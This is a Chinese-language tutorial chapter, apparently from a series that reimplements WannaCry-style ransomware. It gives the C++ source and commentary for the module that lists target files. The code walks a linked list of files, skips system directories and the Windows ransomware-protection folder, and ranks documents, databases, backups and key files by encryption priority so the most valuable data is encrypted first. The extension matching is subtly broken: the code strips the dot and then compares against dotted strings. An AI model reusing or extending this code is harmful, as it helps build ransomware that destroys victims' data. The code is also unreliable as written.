---
title : 09_FileList
---


# FileList

by WL, Liu
Date : 2021-10-15

---
## 壹、簡介
檔案進行加密需要時間，還必須有一定的順序，藉此才能確保被入侵者發現前，同樣的時間內掌握最高的價值，對最重要的檔案進行加密，才能達到勒索的效果，檔案加密不僅僅是檔案加密，更重要的是排序。舉例來說，副檔名會先從.doc開始，通常.doc會存在比較重要的檔案。為避免重複掃描而浪費時間，故採用鏈狀資料結構，而這裡使用環狀雙向鏈結。
## 貳、標頭黨
將類型定義成數字，以便於型態的紀錄與改變(可透過+1)，其中0為未知類型，其他定義如下所示。後面將目錄名定義成方便紀錄之文字。
```cpp=
#pragma once
#include <Windows.h>
#include "../Common/common.h"

#define FILETYPE_UNKNOWN	0     //未知檔案
#define FILETYPE_EXE_DLL	1     //EXE或是DLL檔案
#define FILETYPE_HIGH_PRIORITY	2     //高優先檔案
#define FILETYPE_LOW_PRIORITY	3     //低優先檔案
#define FILETYPE_ZIP_TEMP	4     //加密站存檔
#define FILETYPE_WRITESRC	5     //預處理檔案
#define FILETYPE_ENCRYPTED	6     //加密檔

#ifndef BASE_DIRNAME
#define BASE_DIRNAME _T("WANNATRY")
#endif
#ifndef ENCRYPT_ROOT_PATH
// #define ENCRYPT_ROOT_PATH _T("C:\\")
#define ENCRYPT_ROOT_PATH _T("C:\\TESTDATA\\")
#endif

```
* 第5行，0為未知檔案。
* 第6行，1為EXE或是DLL檔案。
* 第7行，2為高優先檔案。
* 第8行，3為低優先檔案。
* 第9行，4為加密站存檔。
* 第10行，5為預處理檔案。
* 第11行，6為加密檔。
* 第14行，目錄名。
* 第18行，因為為測試所用程式碼，故從C:\TESTDATE開始加密。
<!--  -->
此部分撰寫關於建立linked list所需的struct，前者放置完整路徑與資料的所有資訊，後者則是關於linked list之節點的結構。
```cpp=21
struct FileInfo {
	TCHAR m_szFullPath[360];
	TCHAR m_szName[260];
	LARGE_INTEGER m_cbFileSize;
	DWORD m_dwFileType;
};

typedef FileInfo* PFileInfo;

struct FileNode {
	FileNode* m_pPrev;
	FileNode* m_pNext;
	FileInfo m_Info;
};

typedef FileNode* PFileNode;

class FileList
{
public:
	PFileNode m_pHead = NULL;
	ULONG m_nFiles = 0;
	FileList();
	~FileList();
	BOOL Insert(PFileNode);
};

typedef FileList* PFileList;

BOOL isIgnorePath(LPCTSTR, LPCTSTR);
DWORD ClassifyFileType(LPCTSTR);
```
* 第22行，完整路徑。
* 第23行，檔名。
* 第24行，檔案大小。
* 第25行，檔案型態。
* 第31行，連結前一個資料的指標。
* 第32行，連結後一個資料的指標。
* 第33行，檔案訊息。

## 參、主程式
```cpp=
#include "FileList.h"
#include "../config.h"
#include "WanaZip.h"

FileList::FileList()
{
	m_pHead = new FileNode();
	m_pHead->m_pPrev = m_pHead->m_pNext = m_pHead;
	m_nFiles = 0;
}


FileList::~FileList()
{
	delete m_pHead;
	m_pHead = NULL;
	m_nFiles = 0;
}

BOOL FileList::Insert(PFileNode pNode)
{
	pNode->m_pNext = m_pHead;
	pNode->m_pPrev = m_pHead->m_pPrev;
	pNode->m_pPrev->m_pNext = pNode;
	m_pHead->m_pPrev = pNode;
	m_nFiles++;
	return TRUE;
}

```
* 第8行，m_pHead->m_pNext表示鏈結的head，m_pHead->m_pPrev表示鏈結的tail
* 第9行，目前未定義檔案類型，故設為0。
* 第20到第28行，環狀雙向鏈結的製作，其詳細操作原理可看前面的說明文件。

```cpp=30
BOOL isIgnorePath(LPCTSTR pFullPath, LPCTSTR pFileName)
{
	LPCTSTR pPath1 = _tcsnicmp(
		pFullPath,
		_T("\\\\"), 2) == 0 ?
		_tcsstr(pFullPath, _T("$\\")) :
		pFullPath + 1;
	LPCTSTR pPath2 = pPath1 + 1;
	if (pPath1) {
		if (!_tcsicmp(pPath2, _T("\\Intel")) ||
			!_tcsicmp(pPath2, _T("\\ProgramData")) ||
			!_tcsicmp(pPath2, _T("\\WINDOWS")) ||
			!_tcsicmp(pPath2, _T("\\Program Files")) ||
			!_tcsicmp(pPath2, _T("\\Program Files (x86)")) ||
			_tcsstr(pPath2, _T("\\AppData\\Local\\Temp")) ||
			_tcsstr(pPath2, _T("\\Local Settings\\Temp"))) {
			DEBUG("Skip %s\n", pFullPath);
			return TRUE;
		}
	}
	if (!_tcsicmp(pFileName, _T("This folder protects against ransomware. Modifying it will reduce protection")) ||
		!_tcsicmp(pFileName, _T("Temporary Internet Files")) ||
		!_tcsicmp(pFileName, _T("Content.IE5"))) {
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}
	if (!_tcsicmp(pFileName, BASE_DIRNAME)) {
		DEBUG("Skip %s\n", pFullPath);
		return TRUE;
	}
	return FALSE;
}

```
* 第37到第49行，若路徑出現以下目錄，則無須加密。
```cpp=63
DWORD ClassifyFileType(LPCTSTR pFileName)
{
	static LPCTSTR HighPriorityFiles[] = { _T(".doc"),
		_T(".docx"), _T(".xls"), _T(".xlsx"), _T(".ppt"),
		_T(".pptx"), _T(".pst"), _T(".ost"), _T(".msg"),
		_T(".eml"), _T(".vsd"), _T(".vsdx"), _T(".txt"),
		_T(".csv"), _T(".rtf"), _T(".123"), _T(".wks"),
		_T(".wk1"), _T(".pdf"), _T(".dwg"), _T(".onetoc2"),
		_T(".snt"),	_T(".jpeg"), _T(".jpg"), NULL };
	static LPCTSTR LowPriorityFiles[] = { _T(".docb"),
		_T(".docm"), _T(".dot"), _T(".dotm"), _T(".dotx"),
		_T(".xlsm"), _T(".xlsb"), _T(".xlw"), _T(".xlt"),
		_T(".xlm"), _T(".xlc"), _T(".xltx"), _T(".xltm"),
		_T(".pptm"), _T(".pot"), _T(".pps"), _T(".ppsm"),
		_T(".ppsx"), _T(".ppam"), _T(".potx"), _T(".potm"),
		_T(".edb"), _T(".hwp"), _T(".602"), _T(".sxi"),
		_T(".sti"), _T(".sldx"), _T(".sldm"), _T(".sldm"),
		_T(".vdi"), _T(".vmdk"), _T(".vmx"), _T(".gpg"),
		_T(".aes"), _T(".ARC"), _T(".PAQ"), _T(".bz2"),
		_T(".tbk"), _T(".bak"), _T(".tar"), _T(".tgz"),
		_T(".gz"), _T(".7z"), _T(".rar"), _T(".zip"),
		_T(".backup"), _T(".iso"), _T(".vcd"), _T(".bmp"),
		_T(".png"), _T(".gif"), _T(".raw"), _T(".cgm"),
		_T(".tif"), _T(".tiff"), _T(".nef"), _T(".psd"),
		_T(".ai"), _T(".svg"), _T(".djvu"), _T(".m4u"),
		_T(".m3u"), _T(".mid"), _T(".wma"), _T(".flv"),
		_T(".3g2"), _T(".mkv"), _T(".3gp"), _T(".mp4"),
		_T(".mov"), _T(".avi"), _T(".asf"), _T(".mpeg"),
		_T(".vob"), _T(".mpg"), _T(".wmv"), _T(".fla"),
		_T(".swf"), _T(".wav"), _T(".mp3"), _T(".sh"),
		_T(".class"), _T(".jar"), _T(".java"), _T(".rb"),
		_T(".asp"), _T(".php"), _T(".jsp"), _T(".brd"),
		_T(".sch"), _T(".dch"), _T(".dip"), _T(".pl"),
		_T(".vb"), _T(".vbs"), _T(".ps1"), _T(".bat"),
		_T(".cmd"), _T(".js"), _T(".asm"), _T(".h"),
		_T(".pas"), _T(".cpp"), _T(".c"), _T(".cs"),
		_T(".suo"), _T(".sln"), _T(".ldf"), _T(".mdf"),
		_T(".ibd"), _T(".myi"), _T(".myd"), _T(".frm"),
		_T(".odb"), _T(".dbf"), _T(".db"), _T(".mdb"),
		_T(".accdb"), _T(".sql"), _T(".sqlitedb"),
		_T(".sqlite3"), _T(".asc"), _T(".lay6"), _T(".lay"),
		_T(".mml"), _T(".sxm"), _T(".otg"), _T(".odg"),
		_T(".uop"), _T(".std"), _T(".sxd"), _T(".otp"),
		_T(".odp"), _T(".wb2"), _T(".slk"), _T(".dif"),
		_T(".stc"), _T(".sxc"), _T(".ots"), _T(".ods"),
		_T(".3dm"), _T(".max"), _T(".3ds"), _T(".uot"),
		_T(".stw"), _T(".sxw"), _T(".ott"), _T(".odt"),
		_T(".pem"), _T(".p12"), _T(".csr"), _T(".crt"),
		_T(".key"), _T(".pfx"), _T(".der"), NULL };
```
* 第65到第71行，列舉高優先檔案，以便後定義檔案類型，同時排序優先順序。
* 第72到第111行，列舉並排序低優先檔案。
```cpp=112
	if (LPCTSTR lpSuffix = _tcsrchr(pFileName, _T('.'))) {
		lpSuffix++;
		if (!_tcsicmp(lpSuffix, _T(".exe")) ||
			!_tcsicmp(lpSuffix, _T(".dll"))) {
			return FILETYPE_EXE_DLL;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_TEMP)) {
			return FILETYPE_ZIP_TEMP;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_WRITESRC)) {
			return FILETYPE_WRITESRC;
		}
		if (!_tcsicmp(lpSuffix, WZIP_SUFFIX_CIPHER)) {
			return FILETYPE_ENCRYPTED;
		}
		for (int i = 0; HighPriorityFiles[i]; i++) {
			if (!_tcsicmp(lpSuffix, HighPriorityFiles[i])) {
				return FILETYPE_HIGH_PRIORITY;
			}
		}
		for (int i = 0; LowPriorityFiles[i]; i++) {
			if (!_tcsicmp(lpSuffix, LowPriorityFiles[i])) {
				return FILETYPE_LOW_PRIORITY;
			}
		}
	}
	return FILETYPE_UNKNOWN;
}
```
* 第114到第117行，EXE或DLL。
* 第118到第120行，.WNCRYT暫存檔。
* 第121到第123行，.WNCRYT預處理檔。
* 第124到第126行，.WNCRYT加密檔。
* 第127到第131行，測試附檔名是否為高優先檔案。
* 第132到第136行，測試附檔名是否為低優先檔案。
* 第138行，否則回傳未知。